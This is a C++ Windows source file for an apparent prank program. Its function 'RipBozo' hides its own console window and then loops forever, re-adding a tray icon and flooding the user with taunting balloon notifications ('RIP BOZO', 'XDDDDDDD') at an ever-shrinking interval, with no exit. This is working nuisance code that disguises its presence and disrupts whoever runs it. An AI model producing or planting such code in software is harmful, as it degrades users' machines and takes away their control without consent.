#include "stuff.h"
#include <windows.h>
#include <windowsx.h>
#include "resource.h"

#include "strsafe.h"
#pragma comment(lib, "winmm.lib")

#pragma comment( user, "Compiled on " __DATE__ " at " __TIME__ )

// tray icon data
NOTIFYICONDATA m_NID2;

BOOL CreateTrayIcon2()
{
    memset(&m_NID2, 0, sizeof(m_NID2));
    m_NID2.cbSize = sizeof(m_NID2);

    //m_NID.uID = 102;

    // set handle to the window that receives tray icon notifications
    m_NID2.hWnd = GetForegroundWindow();

    // fields that are being set when adding tray icon 
    m_NID2.uFlags = NIF_MESSAGE | NIF_ICON;

    // set image
    m_NID2.hIcon = LoadIcon(NULL,MAKEINTRESOURCE(IDI_BATTERY_IMAGE));

    if (!m_NID2.hIcon)
        return FALSE;

    m_NID2.uVersion = NOTIFYICON_VERSION_4;

    if (!Shell_NotifyIcon(NIM_ADD, &m_NID2))
        return FALSE;

    return Shell_NotifyIcon(NIM_SETVERSION, &m_NID2);
}

BOOL ShowTrayIconBalloon2(LPCTSTR pszTitle, LPCTSTR pszText, UINT unTimeout, DWORD dwInfoFlags)
{
    m_NID2.uFlags |= NIF_INFO;
    m_NID2.uTimeout = unTimeout;
    m_NID2.dwInfoFlags = dwInfoFlags;

    if (StringCchCopy(m_NID2.szInfoTitle, sizeof(m_NID2.szInfoTitle), pszTitle) != S_OK)
        return FALSE;

    if (StringCchCopy(m_NID2.szInfo, sizeof(m_NID2.szInfo), pszText) != S_OK)
        return FALSE;

    return Shell_NotifyIcon(NIM_MODIFY, &m_NID2);
}

void RipBozo() 
{
    double time = 2;
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    while (true) 
    {
	    
	    CreateTrayIcon2();
	    ShowTrayIconBalloon2(L"RIP BOZO", L"RIP BOZO", 1, NIIF_INFO);
        time *= 1.1;
        Sleep(10/time);

	    CreateTrayIcon2();
	    ShowTrayIconBalloon2(L"XDDDDDDD", L"XDDDDDDD", 1, NIIF_WARNING);
        time *= 1.1;
        Sleep(10/time);
    }
}